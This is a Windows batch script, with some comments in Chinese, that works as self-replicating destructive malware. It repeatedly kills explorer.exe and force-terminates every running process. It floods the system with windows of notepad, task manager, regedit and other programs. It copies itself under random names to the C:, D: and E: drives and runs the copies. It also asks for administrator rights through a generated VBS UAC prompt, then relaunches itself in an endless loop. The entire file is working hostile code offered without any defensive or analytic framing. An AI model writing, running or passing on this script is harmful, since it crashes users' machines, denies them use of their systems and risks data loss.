@echo off
:s

set filename=%~nx0
set filepath=%~f0

start cmd /k "taskkill /f /im explorer.exe"

start cmd /k notepad
start cmd /k notepad
start cmd /k notepad
start cmd /k notepad

start cmd /k taskmgr
start cmd /k taskmgr
start cmd /k taskmgr
start cmd /k taskmgr

start cmd /k explorer
start cmd /k explorer
start cmd /k explorer
start cmd /k explorer

start cmd /k "taskkill /f /im explorer.exe"
start cmd /k "taskkill /f /im explorer.exe"
start cmd /k "taskkill /f /im explorer.exe"
start cmd /k "taskkill /f /im explorer.exe"

start cmd /k write
start cmd /k write
start cmd /k write
start cmd /k write

start cmd /k regedit
start cmd /k regedit
start cmd /k regedit
start cmd /k regedit

REM 获取进程ID列表
REM for /f "tokens=2" %%P in ('tasklist ^| findstr /i "."') do (
    REM 使用taskkill命令终止进程
REM     taskkill /f /pid %%P
REM )
start cmd /k "for /f "tokens=2" %%P in ('tasklist ^| findstr /i "."') do (taskkill /f /pid %%P)"

REM 复制自己并打开
set "cur_file_path=%~f0"
set "random_name=%random%%random%%random%%random%%random%%random%%random%"
set "new_file_path1=C:\%random_name%.bat"
set "new_file_path2=D:\%random_name%.bat"
set "new_file_path3=E:\%random_name%.bat"
mkdir "E:\%random_name%"
mkdir "D:\%random_name%"
mkdir "C:\%random_name%"
copy "%cur_file_path%" "%new_file_path1%"
copy "%cur_file_path%" "%new_file_path2%"
copy "%cur_file_path%" "%new_file_path3%"
start cmd /k "%new_file_path1%"
start cmd /k "%new_file_path2%"
start cmd /k "%new_file_path3%"

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

start cmd /k ".\%filename%"
start cmd /k ".\%filename%"
start cmd /k ".\%filename%"
start cmd /k ".\%filename%"

start cmd /k ".\%filename%"
start cmd /k ".\%filename%"
start cmd /k ".\%filename%"
start cmd /k ".\%filename%"

start cmd /k "%filepath%"
start cmd /k "%filepath%"
start cmd /k "%filepath%"
start cmd /k "%filepath%"

start cmd /k "%filepath%"
start cmd /k "%filepath%"
start cmd /k "%filepath%"
start cmd /k "%filepath%"

goto s